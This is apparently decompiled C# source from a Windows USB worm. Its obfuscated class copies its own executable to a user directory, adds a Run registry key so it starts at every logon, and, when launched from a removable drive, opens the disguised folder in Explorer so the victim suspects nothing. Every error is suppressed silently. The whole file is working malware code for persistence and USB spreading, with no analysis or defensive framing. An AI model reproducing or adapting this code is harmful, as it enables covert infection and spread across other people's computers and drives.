using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace uwcrise;

internal class MAEUSB
{
	public string qurarisofilePath = Application.get_ExecutablePath();

	public void qurarisoload_usb(byte[] fileByt)
	{
		try
		{
			if (!Directory.Exists(qurarisoSETPS.qurarisoget_upath()))
			{
				Directory.CreateDirectory(qurarisoSETPS.qurarisoget_upath());
			}
			try
			{
				if (qurarisofilePath != qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbName + ".exe")
				{
					if (fileByt == null)
					{
						File.Copy(qurarisofilePath, qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbName + ".exe", overwrite: true);
					}
					else
					{
						File.WriteAllBytes(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbName + ".exe", fileByt);
					}
				}
				try
				{
					string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|qurariso";
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
					object value = registryKey.GetValue(qurarisoSETPS.qurarisopc_id + "rmbs");
					if (value == null)
					{
						registryKey.SetValue(qurarisoSETPS.qurarisopc_id + "rmbs", qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbName + ".exe");
					}
					else if (value.ToString() != qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbName + ".exe")
					{
						registryKey.SetValue(qurarisoSETPS.qurarisopc_id + "rmbs", qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbName + ".exe");
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public void qurarisoshow_folder()
	{
		try
		{
			if (!(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbName + ".exe" != qurarisofilePath))
			{
				return;
			}
			string directoryName = Path.GetDirectoryName(qurarisofilePath);
			string pathRoot = Path.GetPathRoot(directoryName);
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (!driveInfo.IsReady || driveInfo.DriveType != DriveType.Removable)
				{
					continue;
				}
				string pathRoot2 = Path.GetPathRoot(driveInfo.Name);
				if (pathRoot == pathRoot2)
				{
					string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(qurarisofilePath);
					if (Directory.Exists(directoryName + fileNameWithoutExtension))
					{
						Process.Start("explorer.exe", directoryName + fileNameWithoutExtension);
					}
				}
			}
		}
		catch
		{
		}
	}
}
